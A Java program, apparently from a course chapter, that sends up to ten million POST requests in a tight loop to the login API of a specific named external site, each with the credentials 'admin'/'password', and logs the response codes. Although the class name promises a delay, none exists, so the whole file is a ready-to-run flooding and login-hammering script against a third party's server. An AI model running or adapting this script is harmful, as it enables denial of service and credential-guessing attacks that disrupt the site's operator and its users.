package chapter6;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class HighFrequencyRequestsWithDelay {

    public static void main(String[] args) {
        // 目标接口 URL
        String targetUrl = "https://c86.xinhua115.com/api/login";
        // 请求总数 可以更改
        int totalRequests = 10000000;

        for (int i = 0; i < totalRequests; i++) {
            try {
                // 创建连接
                URL url = new URL(targetUrl);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json;charset=UTF-8");
                connection.setDoOutput(true);

                // 请求体内容（假设发送用户名和错误密码）
                String jsonInput = "{\"username\":\"admin\", \"password\":\"password\"}";

                // 写入请求体
                try (OutputStream os = connection.getOutputStream()) {
                    os.write(jsonInput.getBytes());
                    os.flush();
                }

                // 获取响应状态码
                int responseCode = connection.getResponseCode();
                System.out.println("Request " + (i + 1) + ": Response Code = " + responseCode);

                // 断开连接
                connection.disconnect();



            } catch (Exception e) {
                System.err.println("Error during request " + (i + 1));
                e.printStackTrace();
            }
        }

        System.out.println("All requests completed.");
    }
}
